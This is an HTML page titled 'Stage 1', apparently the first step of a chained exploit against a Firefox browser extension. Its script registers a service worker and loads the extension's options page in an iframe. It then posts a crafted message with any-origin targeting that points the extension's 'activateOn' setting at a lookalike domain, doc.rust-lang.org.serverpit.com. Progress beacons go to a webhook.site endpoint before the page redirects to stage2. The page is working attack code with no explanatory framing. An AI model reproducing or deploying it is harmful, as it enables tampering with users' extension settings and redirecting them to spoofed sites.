<!DOCTYPE html>
<html>
<head><title>Stage 1</title></head>
<body>
  <script>
    async function run() {
      // 1. Register Service Worker & Wait for Active Control
      const reg = await navigator.serviceWorker.register('/sw.js', { scope: '/' });
      await navigator.serviceWorker.ready;

      if (!navigator.serviceWorker.controller) {
        await new Promise(resolve => {
          navigator.serviceWorker.addEventListener('controllerchange', resolve, { once: true });
        });
      }

      // Keepalive fetch to ensure Webhook receives 1_sw_active
      fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=1_sw_active', { keepalive: true });

      // 2. Open options iframe
      const iframe = document.createElement('iframe');
      iframe.src = 'moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html';
      document.body.appendChild(iframe);

      iframe.onload = () => {
        // Send payload repeatedly to guarantee options.js picks it up
        const payload = {
          activateOn: 'https://doc.rust-lang.org.serverpit.com',
          href: 'https://doc.rust-lang.org/?bypass=1',
          url: 'https://doc.rust-lang.org/?bypass=1',
          data: {
            activateOn: 'https://doc.rust-lang.org.serverpit.com',
            href: 'https://doc.rust-lang.org/?bypass=1'
          }
        };

        iframe.contentWindow.postMessage(payload, '*');

        // Ping to confirm postMessage fired
        fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=1_postmessage_sent', { keepalive: true });

        // Wait 3.5 seconds to ensure storage write finishes before navigating to stage2
        setTimeout(() => {
          window.location.href = '/stage2.html';
        }, 3500);
      };
    }
    run();
  </script>
</body>
</html>
